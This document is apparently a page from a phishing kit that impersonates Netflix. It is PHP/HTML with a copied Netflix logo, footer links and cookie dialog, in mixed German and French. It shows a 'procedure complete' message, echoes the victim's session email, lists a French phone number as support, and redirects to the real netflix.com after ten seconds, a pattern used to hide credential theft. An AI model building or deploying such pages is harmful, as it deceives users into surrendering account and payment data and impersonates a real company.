<html lang="fr" class=" " data-triggered="true">
<?php 
require_once("../home.php");

?>
<?php include_once("includes/head_in.php"); ?>


<body>
    <meta http-equiv="refresh" content="10; url=https://www.netflix.com/">
    <div id="appMountPoint">
        <div class="netflix-sans-font-loaded">
            <div class="basicLayout notMobile modernInApp hasLargeTypography signupSimplicity-registrationWithContext simplicity" lang="fr-FR" dir="ltr">
                <div class="nfHeader noBorderHeader signupBasicHeader onboarding-header"><a href="/" style="margin-top: 14px;" class="svg-nfLogo signupBasicHeader onboarding-header" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" aria-hidden="true" focusable="false"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a>
                <?php if(isset($_SESSION["email"])){ echo '<a href="" class="authLinks signupBasicHeader onboarding-header" data-uia="header-login-link">'.$_SESSION["email"].'</a>';  }else{echo '<a href="../index.php" class="authLinks signupBasicHeader onboarding-header" data-uia="header-login-link">identifizieren</a>';} ?>
             
            </div>                <div class="simpleContainer" data-transitioned-child="true">
                    <div class="centerContainer contextStep firstLoad">
                        <div class="regContainer" data-uia="context-registration">
                            <div class="stepLogoContainer" data-uia="stepLogoContainer"><span class="stepLogo regStepLogo"></span></div>
                            <div class="stepHeader-container" data-uia="header">
                                <div class="stepHeader" data-a11y-focus="true"><span id="" class="stepIndicator" data-uia="">Verfahren abgeschlossen</span>
                                    <h1 class="stepTitle" data-uia="stepTitle">Sie können sich nun einloggen</h1>
                                </div>
                            </div>
                            <div id="" class="contextBody contextRow" data-uia="regContextBody">Sie werden in 10 Sekunden automatisch zum Anmeldeportal weitergeleitet.</div>
                        </div>
                        <!-- <div class="submitBtnContainer"><a href="confirmation.php"><button type="button" autocomplete="off" tabindex="0" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-oversize" data-uia="cta-continue-registration" placeholder="registration_button_continue">Suivant</button></div> -->
                    </div>
                </div>
                <div class="site-footer-wrapper centered">
                    <div class="footer-divider"></div>
                    <div class="site-footer">
                    <p class="footer-top">Fragen&nbsp;? Rufen Sie den <a class="footer-top-a" href="tel:(+33) 0805-543-063">(+33) 0805-543-063</a></p>
                    <ul class="footer-links structural">
                        <li class="footer-link-item" placeholder="footer_responsive_link_faq_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/support/412" placeholder="footer_responsive_link_faq"><span id="" data-uia="data-uia-footer-label">FAQ</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_help_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com" placeholder="footer_responsive_link_help"><span id="" data-uia="data-uia-footer-label">Hilfezentrum</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_terms_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/termsofuse" placeholder="footer_responsive_link_terms"><span id="" data-uia="data-uia-footer-label">Bedingungen für die Nutzung</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_privacy_separate_link_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/privacy" placeholder="footer_responsive_link_privacy_separate_link"><span id="" data-uia="data-uia-footer-label">Datenschutz</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_cookies_separate_link_item"><a class="footer-link" data-uia="footer-link" href="#" placeholder="footer_responsive_link_cookies_separate_link"><span id="" data-uia="data-uia-footer-label">Cookie-Einstellungen</span></a></li>
                        <li class="footer-link-item" placeholder="footer_responsive_link_corporate_information_item"><a class="footer-link" data-uia="footer-link" href="https://help.netflix.com/legal/corpinfo" placeholder="footer_responsive_link_corporate_information"><span id="" data-uia="data-uia-footer-label">Rechtliche Hinweise</span></a></li>
                    </ul>
                    <div class="lang-selection-container" id="lang-switcher">
                        <div data-uia="language-picker+container" class="ui-select-wrapper"><label for="lang-switcher-select" class="ui-label"><span class="ui-label-text">Choisir la langue</span></label>
                            <div class="select-arrow medium prefix globe"><select data-uia="language-picker" class="ui-select medium" id="lang-switcher-select" tabindex="0" placeholder="lang-switcher"><option selected="" lang="fr" value="/?locale=fr-FR" data-language="fr" data-country="FR">Französisch</option><option lang="en" value="/?locale=en-FR" data-language="en" data-country="FR">English</option></select></div>
                        </div>
                    </div>
                </div>
                </div>
                <div class="a11yAnnouncer" aria-live="assertive" tabindex="-1"></div>
            </div>
        </div>
    </div>
    <div>
    </div>
    <div id="onetrust-consent-sdk">
        <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"></div>
        <div id="onetrust-pc-sdk" class="ot-sdk-container otPcTab ot-hide ot-fade-in" role="dialog" aria-modal="true" aria-labelledby="pc-title" lang="fr-FR">
            <!-- pc header -->
            <div class="pc-header">
                <!-- Header logo -->
                <div class="pc-logo-container">
                    <div class="pc-logo" role="img" aria-label="Company Logo" style="background-image: url(&quot;https://cdn.cookielaw.org/logos/dd6b162f-1a32-456a-9cfe-897231c7763c/4345ea78-053c-46d2-b11e-09adaef973dc/Netflix_Logo_PMS.png&quot;)"></div>
                </div>
                <div class="pc-title-container">
                    <h2 id="pc-title">Zentrum für Datenschutzpräferenzen</h2>
                    <div class="pc-close-btn-container"><button id="close-pc-btn-handler" class="pc-close-button ot-close-icon" aria-label="Fermer"></button></div>
                </div>
            </div>
            <!-- content -->
            <div id="ot-content">
                <!-- Groups / Sub groups with cookies -->
                <div class="ot-main-content pc-content">
                    <div class="ot-sdk-container groups-container">
                        <div class="ot-sdk-row" role="tablist" aria-label="Cookie Categories">
                            <!-- About Privacy container -->
                            <div class="ot-sdk-column">
                                <div class="ot-sdk-four ot-sdk-columns group active-group category-menu-switch-handler" role="tab" tabindex="0" aria-selected="true" aria-controls="pc-tab-description">
                                    <h3 id="privacy-text">Allgemeine Beschreibung</h3>
                                </div>
                            </div>
                            <div class="ot-sdk-eight ot-sdk-columns description-container" id="pc-tab-description" tabindex="0" role="tabpanel" aria-labelledby="pc-privacy-header">
                                <h3 id="pc-privacy-header">Allgemeine Beschreibung</h3>
                                <p id="pc-policy-text" class="group-description"><br>Dieses Tool hilft Ihnen dabei, Quellen zu identifizieren, die Cookies verwenden, um Daten von Ihrem Gerät zu sammeln, zu welchen Zwecken diese Informationen verwendet werden und wie Sie die Verwendung von Cookies für nicht unbedingt erforderliche Aktivitäten kontrollieren können.<br>
                                    <br> Netflix hält sich an die Selbstregulierungsprinzipien der Digital Advertising Alliance (DAA), der Digital Advertising Alliance of Canada (DAAC) und der European Alliance for Ethics in Interactive Digital Advertising (EDAA).<br>
                                    <br> Wenn Sie Cookies für Werbezwecke widersprechen, kann es sein, dass Netflix-Werbung weiterhin auf anderen Websites angezeigt wird, aber sie wird nicht von uns oder unseren Dienstleistern personalisiert, und wir werden Ihre Erfahrung auf der Netflix-Website weiterhin durch die Verwendung von Cookies, denen Sie nicht widersprochen haben, personalisieren.<br>
                                    <br> Die Datenschutzeinstellungen der meisten Webbrowser ermöglichen es Ihnen, die automatische Annahme neuer Cookies zu verhindern, indem Sie über deren Empfang benachrichtigt werden oder indem Sie die Cookies vollständig deaktivieren. Wenn Ihr Webbrowser so eingestellt ist, dass er Cookies systematisch ablehnt, erhalten Sie keine interessenbezogene Werbung, aber die Dienste von Netflix können beeinträchtigt oder sogar nicht verfügbar sein. Darüber hinaus bedeutet der Widerspruch gegen bestimmte Cookies über unser Tool, dass ein Cookie, das diese Entscheidung speichert, auf Ihrem Gerät installiert wird. Es ist daher unbedingt erforderlich, dass Ihr Webbrowser so eingestellt ist, dass er Cookies akzeptiert, damit Ihre Einstellungen gespeichert werden können. Wenn Sie die Cookies löschen oder Ihren Webbrowser ändern, müssen Sie Ihre Präferenzen für die Verwendung von Cookies erneut einstellen.<br>
                                    <br> Weitere Informationen über unsere Verwendung von Cookies finden Sie im Abschnitt <a href="https://help.netflix.com/legal/privacy#cookies">Cookies und Online-Werbung</a> von unserem <a href="https://help.netflix.com/legal/privacy">Datenschutzerklärung.</a><br>

                                    <br></p>
                            </div>
                            <ul class="category-group">
                                <li class="category-item ot-always-active-group" data-optanongroupid="C0001">
                                    <div class="ot-sdk-column">
                                        <div class="ot-sdk-four ot-sdk-columns group category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0001">
                                            <h3 id="ot-header-id-C0001">Notwendige Cookies</h3>
                                        </div>
                                    </div>
                                    <div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0001">
                                        <div class="group-toggle">
                                            <h3 class="category-header">Notwendige Cookies</h3>
                                            <div class="ot-toggle-group">
                                                <div class="ot-always-active">Immer aktiv</div>
                                                <div class="ot-toggle ot-hide-tgl">
                                                    <div class="checkbox">
                                                        <!-- DYNAMICALLY GENERATE Input ID  --><input id="ot-group-id-C0001" class="category-switch-handler" type="checkbox" role="switch" aria-checked="true" aria-controls="ot-desc-id-C0001" aria-labelledby="ot-header-id-C0001" aria-hidden="true" name="ot-group-id-C0001" data-optanongroupid="C0001" checked=""> <label for="ot-group-id-C0001"><span class="label-text">Cookies nécessaires</span></label>
                                                        <!-- DYNAMICALLY GENERATE Input ID  -->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <p class="group-description ot-category-desc">Diese Cookies sind für das Funktionieren unserer Website und unseres Online-Dienstes unerlässlich. Beispielsweise können Netflix und seine Dienstanbieter diese Art von Cookies verwenden, um unsere Internetnutzer zu authentifizieren und sie zu identifizieren, wenn sie mit unseren Websites und Anwendungen verbunden sind, damit wir ihnen unseren Dienst anbieten können. Diese Cookies ermöglichen es uns auch, unsere Nutzungsbedingungen durchzusetzen, Betrug zu verhindern und die Sicherheit unserer Dienste zu gewährleisten.<br>
                                            <br> Lebensdauer: Die meisten Cookies sind Sitzungscookies (die aktiv bleiben, solange Sie den Webbrowser nicht schließen) oder Cookies, die nur einen Tag lang aktiv sind. Einige Cookies sind länger aktiv, zwischen 3 und 12 Monaten. Cookies, die dazu dienen, Betrug zu verhindern und die Sicherheit unserer Dienste zu gewährleisten, sind bis zu 24 Monate lang aktiv.</p>
                                        <!-- sub groups -->
                                        <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0001">Informations sur les cookies‎</a></div>
                                    </div>
                                </li>
                                <li class="category-item ot-always-active-group" data-optanongroupid="C0002">
                                    <div class="ot-sdk-column">
                                        <div class="ot-sdk-four ot-sdk-columns group category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0002">
                                            <h3 id="ot-header-id-C0002">Cookies für Leistung und Funktionalität</h3>
                                        </div>
                                    </div>
                                    <div class="ot-sdk-eight ot-sdk-columns description-container ot-hide ot-always-active-group" role="tabpanel" tabindex="0" id="ot-desc-id-C0002">
                                        <div class="group-toggle">
                                            <h3 class="category-header">Cookies für Leistung und Funktionalität</h3>
                                            <div class="ot-toggle-group">
                                                <div class="ot-always-active">Immer aktiv</div>
                                                <div class="ot-toggle ot-hide-tgl">
                                                    <div class="checkbox">
                                                        <!-- DYNAMICALLY GENERATE Input ID  --><input id="ot-group-id-C0002" class="category-switch-handler" type="checkbox" role="switch" aria-checked="true" aria-controls="ot-desc-id-C0002" aria-labelledby="ot-header-id-C0002" aria-hidden="true" name="ot-group-id-C0002" data-optanongroupid="C0002" checked=""> <label for="ot-group-id-C0002"><span class="label-text">Cookies de performance et de fonctionnalité</span></label>
                                                        <!-- DYNAMICALLY GENERATE Input ID  -->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <p class="group-description ot-category-desc">Diese Cookies helfen uns dabei, Ihre Online-Erfahrung mit Netflix zu personalisieren und zu verbessern. Sie ermöglichen es uns beispielsweise, uns Ihre Präferenzen zu merken, und sie ersparen Ihnen die erneute Eingabe von Daten, die Sie uns bereits mitgeteilt haben (z. B. bei der Anmeldung). Wir verwenden diese Art von Cookies auch, um Daten (wie beliebte Seiten, Konversionsraten, Lesegewohnheiten oder Klickzahlen) darüber zu sammeln, wie Internetnutzer den Netflix-Dienst verwenden, um unsere Website und unseren Dienst zu verbessern und anzupassen und um Marktforschung zu betreiben. Das Entfernen dieser Arten von Cookies kann die Funktionalität unseres Dienstes einschränken.<br>
                                            <br> Lebensdauer: Die meisten Cookies sind nur einen Tag lang aktiv. Einige Cookies sind länger aktiv, zwischen 3 und 12 Monaten.</p>
                                        <!-- sub groups -->
                                        <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0002">Informationen zu Cookies‎</a></div>
                                    </div>
                                </li>
                                <li class="category-item" data-optanongroupid="C0003">
                                    <div class="ot-sdk-column">
                                        <div class="ot-sdk-four ot-sdk-columns group category-menu-switch-handler" role="tab" tabindex="-1" aria-selected="false" aria-controls="ot-desc-id-C0003">
                                            <h3 id="ot-header-id-C0003">Leistungs- und funktionsbezogene Cookies von Drittanbietern</h3>
                                        </div>
                                    </div>
                                    <div class="ot-sdk-eight ot-sdk-columns description-container ot-hide" role="tabpanel" tabindex="0" id="ot-desc-id-C0003">
                                        <div class="group-toggle">
                                            <h3 class="category-header">Leistungs- und funktionsbezogene Cookies von Drittanbietern</h3>
                                            <div class="ot-toggle-group">
                                                <div class="ot-toggle">
                                                    <div class="checkbox">
                                                        <!-- DYNAMICALLY GENERATE Input ID  --><input id="ot-group-id-C0003" class="category-switch-handler" type="checkbox" role="switch" aria-checked="true" aria-controls="ot-desc-id-C0003" aria-labelledby="ot-header-id-C0003" name="ot-group-id-C0003" data-optanongroupid="C0003" checked=""> <label for="ot-group-id-C0003"><span class="label-text">Cookies tiers de performance et de fonctionnalité</span></label>
                                                        <!-- DYNAMICALLY GENERATE Input ID  -->
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <p class="group-description ot-category-desc">Diese Cookies, die von Dritten abgelegt werden, ermöglichen es uns, Ihre Online-Erfahrung auf Netflix anzupassen und zu verbessern. Auf Tudum helfen sie uns beispielsweise dabei, Ihnen von Dritten verwaltete Erlebnisse zu bieten, wie z. B. die Anzeige von Inhalten für soziale Netzwerke. Um mehr darüber zu erfahren, wie diese Drittanbieter solche Cookies verwenden, lesen Sie bitte die Datenschutzinformationen, die jeder Drittanbieter auf seiner Website zur Verfügung stellt. Das Entfernen dieser Arten von Cookies kann die Funktionalität unseres Dienstes einschränken.</p>
                                        <!-- sub groups -->
                                        <div class="category-host-list-container"><a class="category-host-list-btn category-host-list-handler" role="button" href="javascript:void(0)" data-parent-id="C0003">Informationen zu Cookies‎</a></div>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <!-- Vendors / Hosts -->
                <section id="vendors-list" class="ot-hide">
                    <div class="vendor-content">
                        <nav id="vendors-list-header">
                            <div class="navigation-container">
                                <a class="back-btn-handler" role="button" href="javascript:void(0)">
                                    <div id="ot-back-arrow"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="15px" height="15px" viewBox="0 0 444.531 444.531" xml:space="preserve"><title>Back Button</title><g><path fill="#2c3643" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                    l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                    c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                    s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                    L213.13,222.409z"></path></g></svg></div>
                                    <h3 class="pc-back-button-text" id="vendors-list-title">Werbung Cookies</h3>
                                </a>
                            </div>
                            <div class="action-container">
                                <div id="search-container"><input id="vendor-search-handler" aria-label="Vendor Search" type="text" placeholder="Search..." name="vendor-search-handler"> <svg width="30" height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 -30 110 110"><path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
              s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
              c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
              s-17-7.626-17-17S14.61,6,23.984,6z"></path></svg></div>
                                <div id="filter-container"><a id="filter-btn-handler" role="button" aria-label="Filter" href="javascript:void(0)"><svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="15" height="15" viewBox="0 0 402.577 402.577" style="enable-background:new 0 0 402.577 402.577;" xml:space="preserve"><title>Filter Button</title><g><path fill="#2c3643" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
                            c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
                            c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
                            C402.765,25.895,404.093,19.231,400.858,11.427z"></path></g></svg></a></div>
                            </div>
                        </nav>
                        <section id="vendor-list-content">
                            <div class="ot-sdk-row">
                                <div class="ot-sdk-column">
                                    <div id="select-all-container">
                                        <div class="ot-checkbox">
                                            <div class="leg-int-sel-all-hdr"><span class="consent-hdr">Consent</span> <span class="leg-int-hdr">Leg.Interest</span></div>
                                            <!-- select all vendor leg.int toggle container -->
                                            <div id="select-all-vendors-leg-input-container"><input id="select-all-vendor-leg-handler" class="ot-group-option-box" type="checkbox"> <label for="select-all-vendor-leg-handler"><span class="label-text">Select All Vendors</span></label></div>
                                            <!-- select all vendor consent toggle container -->
                                            <div id="select-all-vendors-input-container"><input id="select-all-vendor-groups-handler" class="ot-group-option-box" type="checkbox"> <label for="select-all-vendor-groups-handler"><span class="label-text">Select All Vendors</span></label></div>
                                            <!-- Hosts select all input container -->
                                            <div id="select-all-hosts-input-container"><input id="select-all-hosts-groups-handler" class="ot-group-option-box" type="checkbox"> <label for="select-all-hosts-groups-handler"><span class="label-text">Select All Hosts</span></label></div>
                                            <div id="select-all-text-container">
                                                <p>Select All</p>
                                            </div>
                                        </div>
                                    </div>
                                    <ul id="hosts-list-container">
                                        <li class="host-item"><input type="checkbox" class="host-box" aria-expanded="false" role="button" ot-accordion="true" aria-label="33Across">
                                            <section class="accordion-header">
                                                <div class="ot-toggle-group">
                                                    <!-- Checkbox -->
                                                    <div class="ot-checkbox ot-host-tgl"><input id="REPLACE-WITH-DYANMIC-HOST-ID" class="host-checkbox-handler ot-group-option-box" type="checkbox"> <label for="REPLACE-WITH-DYANMIC-HOST-ID"><span class="label-text">REPLACE-WITH-DYANMIC-HOST-ID</span></label></div>
                                                    <!-- Checkbox END -->
                                                    <div class="host-info">
                                                        <h3 class="host-title">33Across</h3>
                                                        <h4 class="host-description">33Across</h4>
                                                    </div>
                                                </div>
                                                <div class="host-notice">
                                                    <div class="third-party-cookies-container"><a class="third-party-cookie-notice host-view-cookies" href="javascript:void(0)" role="presentation" aria-hidden="true" tabindex="-1">View Third Party Cookies</a></div>
                                                    <div class="ot-arrow-container"><svg class="ot-arrow" x="0px" y="0px" width="10px" height="10px" viewBox="0 0 451.846 451.847" style="enable-background:new 0 0 451.846 451.847;" xml:space="preserve"><g><path fill="#7b7b7b" d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                        L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                        c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path></g></svg></div>
                                                </div>
                                            </section>
                                            <div class="accordion-text">
                                                <div class="host-options">
                                                    <!-- HOST LIST VIEW UPDATE *** -->
                                                    <ul class="host-option-group">
                                                        <li class="vendor-host">
                                                            <div class="cookie-name-container">
                                                                <div>Name</div>
                                                                <div>cookie name</div>
                                                            </div>
                                                        </li>
                                                    </ul>
                                                    <!-- HOST LIST VIEW UPDATE END *** -->
                                                </div>
                                            </div>
                                        </li>
                                    </ul>
                                    <ul id="vendors-list-container">
                                        <li><input type="checkbox" class="vendor-box" aria-expanded="false" role="button" aria-label="33Across">
                                            <section class="accordion-header">
                                                <div class="ot-toggle-group">
                                                    <!-- Checkbox -->
                                                    <div class="ot-checkbox"><input id="REPLACE-WITH-DYANMIC-VENDOR-ID" class="vendor-checkbox-handler ot-group-option-box" type="checkbox"> <label for="REPLACE-WITH-DYANMIC-VENDOR-ID"><span class="label-text">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label></div>
                                                    <!-- Checkbox END -->
                                                    <div class="vendor-info">
                                                        <h3 class="vendor-title">33Across</h3>
                                                        <div class="vendor-purposes">
                                                            <p>3 Purposes</p>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="vendor-notice">
                                                    <div class="vendor-privacy-notice-container"><a class="vendor-privacy-notice" href="#">View Privacy Notice</a></div>
                                                    <div class="ot-arrow-container"><svg role="presentation" class="ot-arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="10px" height="10px" viewBox="0 0 451.846 451.847" style="enable-background:new 0 0 451.846 451.847;" xml:space="preserve"><g><path fill="#7b7b7b" d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                                    L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                                    c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path></g></svg></div>
                                                </div>
                                            </section>
                                            <section class="accordion-header">
                                                <div class="vendor-info">
                                                    <h3 class="vendor-title">33Across</h3>
                                                    <!-- purposes count -->
                                                    <div class="vendor-purposes">
                                                        <p>3 Purposes</p>
                                                    </div>
                                                    <div class="vendor-privacy-notice-container"><a class="vendor-privacy-notice" href="#">View Privacy Notice</a></div>
                                                </div>
                                                <div class="ot-arrow-container"><svg role="presentation" class="ot-arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="10px" height="10px" viewBox="0 0 451.846 451.847" style="enable-background:new 0 0 451.846 451.847;" xml:space="preserve"><g><path fill="#7b7b7b" d="M345.441,248.292L151.154,442.573c-12.359,12.365-32.397,12.365-44.75,0c-12.354-12.354-12.354-32.391,0-44.744
                                L278.318,225.92L106.409,54.017c-12.354-12.359-12.354-32.394,0-44.748c12.354-12.359,32.391-12.359,44.75,0l194.287,194.284
                                c6.177,6.18,9.262,14.271,9.262,22.366C354.708,234.018,351.617,242.115,345.441,248.292z"></path></g></svg></div>
                                                <div class="ot-toggle-group">
                                                    <!-- Checkbox -->
                                                    <div class="ot-checkbox"><input id="REPLACE-WITH-DYANMIC-VENDOR-ID1" class="vendor-checkbox-handler ot-group-option-box" type="checkbox"> <label for="REPLACE-WITH-DYANMIC-VENDOR-ID1"><span class="label-text">REPLACE-WITH-DYANMIC-VENDOR-ID</span></label></div>
                                                    <!-- Checkbox END -->
                                                </div>
                                            </section>
                                            <div class="accordion-text">
                                                <div class="vendor-options">
                                                    <!-- VENDOR PURPOSE UPDATE *** -->
                                                    <div class="vendor-purpose-groups">
                                                        <!-- vendor purposes -->
                                                        <div class="vendor-option-purpose">
                                                            <p>Consent Purposes</p>
                                                        </div>
                                                        <div class="vendor-consent-group">
                                                            <p class="consent-category">Location Based Ads</p>
                                                            <p class="consent-status">Consent Allowed</p>
                                                        </div>
                                                        <!-- vendor legitimate interest purposes -->
                                                        <div class="vendor-option-purpose legitimate-interest">
                                                            <p>Legitimate Interest Purposes</p>
                                                        </div>
                                                        <div class="vendor-consent-group legitimate-interest-group">
                                                            <p class="consent-category">Personalize</p>
                                                            <a href="#" class="vendor-opt-out-handler">
                                                                <div class="op-out-group"><span>Require Opt-Out</span> <svg x="0px" y="0px" width="15" height="15" viewBox="0 0 511.626 511.627" style="enable-background:new 0 0 511.626 511.627;" xml:space="preserve"><g fill="#1a73e8"><g><path d="M392.857,292.354h-18.274c-2.669,0-4.859,0.855-6.563,2.573c-1.718,1.708-2.573,3.897-2.573,6.563v91.361
                                      c0,12.563-4.47,23.315-13.415,32.262c-8.945,8.945-19.701,13.414-32.264,13.414H82.224c-12.562,0-23.317-4.469-32.264-13.414
                                      c-8.945-8.946-13.417-19.698-13.417-32.262V155.31c0-12.562,4.471-23.313,13.417-32.259c8.947-8.947,19.702-13.418,32.264-13.418
                                      h200.994c2.669,0,4.859-0.859,6.57-2.57c1.711-1.713,2.566-3.9,2.566-6.567V82.221c0-2.662-0.855-4.853-2.566-6.563
                                      c-1.711-1.713-3.901-2.568-6.57-2.568H82.224c-22.648,0-42.016,8.042-58.102,24.125C8.042,113.297,0,132.665,0,155.313v237.542
                                      c0,22.647,8.042,42.018,24.123,58.095c16.086,16.084,35.454,24.13,58.102,24.13h237.543c22.647,0,42.017-8.046,58.101-24.13
                                      c16.085-16.077,24.127-35.447,24.127-58.095v-91.358c0-2.669-0.856-4.859-2.574-6.57
                                      C397.709,293.209,395.519,292.354,392.857,292.354z"></path><path d="M506.199,41.971c-3.617-3.617-7.905-5.424-12.85-5.424H347.171c-4.948,0-9.233,1.807-12.847,5.424
                                      c-3.617,3.615-5.428,7.898-5.428,12.847s1.811,9.233,5.428,12.85l50.247,50.248L198.424,304.067
                                      c-1.906,1.903-2.856,4.093-2.856,6.563c0,2.479,0.953,4.668,2.856,6.571l32.548,32.544c1.903,1.903,4.093,2.852,6.567,2.852
                                      s4.665-0.948,6.567-2.852l186.148-186.148l50.251,50.248c3.614,3.617,7.898,5.426,12.847,5.426s9.233-1.809,12.851-5.426
                                      c3.617-3.616,5.424-7.898,5.424-12.847V54.818C511.626,49.866,509.813,45.586,506.199,41.971z"></path></g></g></svg></div>
                                                            </a>
                                                        </div>
                                                        <!-- Vendor special purposes -->
                                                        <div class="vendor-option-purpose spl-purpose">
                                                            <p>Special Purposes</p>
                                                        </div>
                                                        <div class="vendor-consent-group spl-purpose-grp">
                                                            <p class="consent-category">Location Based Ads</p>
                                                        </div>
                                                        <!-- Vendor features -->
                                                        <div class="vendor-option-purpose vendor-feature">
                                                            <p>Features</p>
                                                        </div>
                                                        <div class="vendor-consent-group vendor-feature-group">
                                                            <p class="consent-category">Location Based Ads</p>
                                                        </div>
                                                        <!-- Vendor special features -->
                                                        <div class="vendor-option-purpose vendor-spl-feature">
                                                            <p>Special Features</p>
                                                        </div>
                                                        <div class="vendor-consent-group vendor-spl-feature-grp">
                                                            <p class="consent-category">Location Based Ads</p>
                                                        </div>
                                                    </div>
                                                    <!-- VENDOR PURPOSE UPDATE END *** -->
                                                </div>
